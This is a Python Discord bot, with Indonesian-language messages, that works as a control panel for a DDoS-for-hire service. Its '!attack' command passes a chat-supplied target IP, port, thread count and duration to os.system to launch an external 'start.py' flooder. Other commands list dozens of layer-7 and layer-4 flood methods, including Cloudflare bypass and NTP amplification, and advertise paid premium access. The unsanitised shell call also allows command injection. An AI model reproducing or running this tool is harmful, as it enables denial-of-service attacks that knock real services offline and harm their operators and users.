import discord
import os
import time
from discord.ext import commands

owners  = [YOUR DISCORD ID]

client = commands.Bot(command_prefix="!", help_command=None)


@client.event
async def on_ready():
    print("Bot Sudah Aktif !!  Dm VanZ#0001 untuk Membuka Fitur VVIP")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f"MENU KETIK !help"))

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        print("Command Tidak Dapat Di Temukan")
    if isinstance(error, commands.MissingRequiredArgument):
        if ctx.command.qualified_name == 'TCP':
            await ctx.send("**>attack TCP IP PORT PACKET THREADS**")
        if ctx.command.qualified_name == 'UDP':
            await ctx.send("**>attack UDP IP PORT PACKET THREADS**")
@client.command()
async def ping(ctx):
    embed=discord.Embed(
        title=f":hourglass: Bot HTTP Ping is {round(client.latency * 1000)}ms",
        color=discord.Colour.red()
    )
    await ctx.reply(embed=embed)

@client.command()
async def attack(ctx, method, ip, port, threads, times):
    if ctx.author.id not in owners:
        await ctx.send(":clown: Kamu Tidak Ada Izin Untuk Memakai BOT DDOS | Boost Server Untuk Membuka Premium  :clown:")
    else:
        await ctx.send(f"Attack Success:white_check_mark:  \n-IP:{ip}\n-PORT:{port}\n-Threads:{threads}\n- Duration:{times}")
        os.system(f"python start.py {method} {ip} {port} {threads} {times}")

@client.command()
async def help(ctx):
    await ctx.send("```\n!ping (SHOW BOT PING)\n!methods (SHOW METHODS)\n!usage (SHOW TUTURIAL)\n!owner (SHOW OWNER BOT)\n!stop (STOP ATTACK BOT)\n!socks (SHOW SOCKS TYPE```")

@client.command()
async def usage(ctx):
    await ctx.reply("!attack METHOD IP PORT THREADS TIME")

@client.command()
async def owner(ctx):
    await ctx.reply("Owner bot```\n@VanZ#0001```")

@client.command()
async def socks(ctx):
    await ctx.reply("Socks Type Beta Test:\nSocksTypes:\n-6=RANDOM\n-5=SOCKS5\n-4=SOCKS4\n-1=HTTP\n-0=ALL")


@client.command()
async def methods(ctx):
    embed=discord.Embed(
        title="-L7 METHODS\n-STRESS\n-DYN\n-HEAD\n-EVEN\n-NULL\n-PPS\n-BOMB\n-AVB\n-TOR\n-GET\n-DOWNLOADER\n-APACHE\n-CFBUAM\n-OVH\n-BOT\n-RHEX\n-COOKIE\n-CFB\n-POST\n-XMLRPC\n-GSB\n-BYPASS\n-KILLER\n-DGB\n-SLOW\n-STOMP\n \nL4 Methods\n-MEM\n-NTP\n-MCBOT\n-TCP\n-UDP\n-CONNETION\n-MINECRAFT",
        color=discord.Colour.random()
    )
    await ctx.reply(embed=embed)

@client.command()
async def stop(ctx):
    await ctx.reply("Suscses Stop Attack")
    os.system(f"py start.py stop")

client.run("YOUR BOT TOKEN", bot=True)
